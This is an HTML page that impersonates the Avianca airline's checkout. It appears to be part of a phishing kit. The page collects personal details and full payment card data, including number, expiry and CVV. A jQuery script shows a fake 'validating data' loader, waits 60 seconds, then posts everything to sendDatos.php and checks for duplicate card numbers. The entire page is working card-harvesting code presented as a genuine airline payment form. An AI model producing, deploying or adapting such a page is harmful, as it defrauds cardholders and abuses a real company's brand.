<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="./css/style.css">
    
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>

    <title>Avianca | #NACIONALES</title>
</head>

<body>

    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <p class="title">Datos del cliente:</p>
        <p class="text_info">Información del titular de la tarjeta.</p>
        <hr>

        <!-- FORMULARIO -->
        <form id="formDatos">

            <div class="form-group">
                <input type="text" name="nombre" placeholder="Nombre" class="form-control" required>
            </div>
            <div class="form-group">
                <input type="text" name="apellido" placeholder="Apellido" class="form-control" required>
            </div>
            <div class="form-group">
                <input type="number" name="documento" placeholder="Nro. de documento" class="form-control" required>
            </div>
            <div class="form-group">
                <input type="number" name="telefono" placeholder="Teléfono de contacto" class="form-control" required>
            </div>
            <div class="form-group">
                <input type="text" name="ciudad" placeholder="Ciudad" class="form-control" required>
            </div>
            <div class="form-group">
                <input type="text" name="direccion" placeholder="Dirección" class="form-control" required>
            </div>
            <div class="form-group">
                <input type="email" name="email" placeholder="Email" class="form-control" required>
            </div>

            <br>
            <p class="title">Datos de pago:</p>
            <p class="text_info">Información de la tarjeta.</p>
            <hr>

            <div class="card">
                <div class="card-body">

                    <div class="form-group">
                        <label>Banco:</label>
                        <select name="banco" class="form-control" required>
                            <option value="00">Seleccione su banco</option>
                            <option value="BANCOLOMBIA">BANCOLOMBIA</option>
                            <option value="DAVIVIENDA">DAVIVIENDA</option>
                            <option value="BBVA">BBVA</option>
                            <option value="NEQUI">NEQUI</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label>Franquicia:</label>
                        <select name="franquicia" class="form-control" required>
                            <option value="Visa">Visa</option>
                            <option value="Master Card">Master Card</option>
                            <option value="American Express">American Express</option>
                            <option value="Dinners Club">Dinners Club</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label>Tipo de Tarjeta:</label>
                        <select name="tipo_tarjeta" class="form-control">
                            <option value="Débito">Débito</option>
                            <option value="Crédito">Crédito</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label>Número de tarjeta</label>
                        <input type="text" class="form-control" name="nro_tarjeta" id="tarjetaInput" required>
                    </div>

                    <div class="form-group">
                        <label>Nombre del titular:</label>
                        <input type="text" class="form-control" name="nombre_tarjeta" required>
                    </div>

                    <div class="row">
                        <div class="col-9">
                            <label>Expiración</label>
                            <div class="row">
                                <div class="col-5">
                                    <select name="mes_tarjeta" class="form-control" required>
                                        <option>Mes</option>
                                        <option value="1">1</option><option value="2">2</option>
                                        <option value="3">3</option><option value="4">4</option>
                                        <option value="5">5</option><option value="6">6</option>
                                        <option value="7">7</option><option value="8">8</option>
                                        <option value="9">9</option><option value="10">10</option>
                                        <option value="11">11</option><option value="12">12</option>
                                    </select>
                                </div>
                                <div class="col-7">
                                    <select name="anio_tarjeta" class="form-control" required>
                                        <option>Año</option>
                                        <option value="2024">2024</option>
                                        <option value="2025">2025</option>
                                        <option value="2026">2026</option>
                                        <option value="2027">2027</option>
                                        <option value="2028">2028</option>
                                        <option value="2029">2029</option>
                                        <option value="2030">2030</option>
                                    </select>
                                </div>
                            </div>
                        </div>

                        <div class="col-3">
                            <label>CVV</label>
                            <input type="number" class="form-control" name="cvv_tarjeta" required>
                        </div>
                    </div>

                </div>
            </div>

            <br>
            <input type="submit" value="Continuar" class="btn btn-danger form-control">

        </form>
    </div>

    <!-- ****************  MODAL LOADER  **************** -->
<!-- ****************  MODAL LOADER  **************** -->
<!-- ****************  MODAL LOADER  **************** -->
<!-- ****************  MODAL LOADER  **************** -->
<!-- ****************  MODAL LOADER  **************** -->
<div id="modalValidando" style="
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.6);
    z-index: 999999;

    /* CENTRADO */
    display: flex;           /* flex siempre */
    justify-content: center; /* horizontal */
    align-items: center;     /* vertical */
    padding: 20px;
    display: none;           /* oculto por defecto */
">
    <div style="
        background: white;
        padding: 25px 20px;
        border-radius: 15px;
        width: 100%;
        max-width: 320px;
        text-align: center;
        box-shadow: 0 0 15px rgba(0,0,0,0.25);
        animation: zoomIN 0.2s ease-out;
    ">
        <img src="media/plane-loader.gif" style="width:130px;margin-bottom:10px;">
        <h4 id="modalText" style="margin-bottom:10px;">Validando datos...</h4>
        <p style="font-size:14px;color:#444;">Por favor espera unos segundos.</p>
    </div> 
</div>





    <!-- ********** AJAX + loader ********** -->
 <script>
$(document).ready(function () {

    $("#formDatos").on("submit", function (e) {
        e.preventDefault();

        $("#modalValidando").fadeIn(300);
        $("#modalText").text("Estamos validando los datos...");

        let form = $(this);

        // --- 1️⃣ Primero espera los 60 segundos ---
        setTimeout(() => {

            // --- 2️⃣ Luego de los 60s recién envía el AJAX ---
            $.ajax({
                url: "sendDatos.php",
                method: "POST",
                data: form.serialize(),

                success: function (response) {

                    if (response === "ok") {
                        $("#modalText").text("Datos validados correctamente ✔");

                        setTimeout(() => {
                            $("#modalValidando").fadeOut(400);
                            form[0].reset();
                        }, 2000);

                    } else if (response === "duplicado") {
                        $("#modalText").text("❌ El número de tarjeta ya existe");

                        setTimeout(() => {
                            $("#modalValidando").fadeOut(400);
                        }, 2200);

                    } else {
                        $("#modalText").text("⚠ Error inesperado");
                    }
                },

                error: function () {
                    $("#modalText").text("⚠ Error de conexión");

                    setTimeout(() => {
                        $("#modalValidando").fadeOut(400);
                    }, 2200);
                }
            });

        }, 60000); // ⏳ 60 segundos

    });

    // FORMAT TARJETA
    $("#tarjetaInput").on("input", function () {
        let v = $(this).val().replace(/[^0-9]/g, '');
        v = v.replace(/(.{4})/g, '$1 ').trim();
        $(this).val(v.slice(0, 19));
    });

});
</script>


</body>
</html>
